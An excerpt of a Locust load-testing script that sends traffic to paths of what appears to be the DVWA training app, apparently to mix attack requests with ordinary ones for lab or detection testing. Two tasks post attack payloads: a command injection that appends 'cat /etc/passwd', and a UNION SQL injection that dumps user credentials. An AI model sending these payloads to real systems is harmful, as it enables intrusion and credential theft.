...
class MyUser(HttpUser):
    ...
    def index(self):
        ua = pick_ua()
        self.client.get("/index.php", headers=build_headers(), verify=False)

    @task(100)
    def about(self):
        ua = pick_ua()
        self.client.get("/about.php", headers=build_headers(), verify=False)

    @task(100)
    def security(self):
        ua = pick_ua()
        self.client.get("/security.php", headers=build_headers(), verify=False)

    @task(10)
    def vuln_xss(self):
        ua = pick_ua()
        self.client.post("/vulnerabilities/exec/", headers=build_headers(), data={"ip": "ping 127.0.0.1 & cat /etc/passwd", "Submit": "Submit"}, verify=False)
    ...
    def vuln_sqli(self):
        ua = pick_ua()      
        self.client.post("/vulnerabilities/sqli/", headers=build_headers(), data={"id": "%' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #","Submit": "Submit"},verify=False)
    ...
    def instructions(self):
        ua = pick_ua()
        self.client.get("/instructions.php", headers=build_headers(), verify=False)
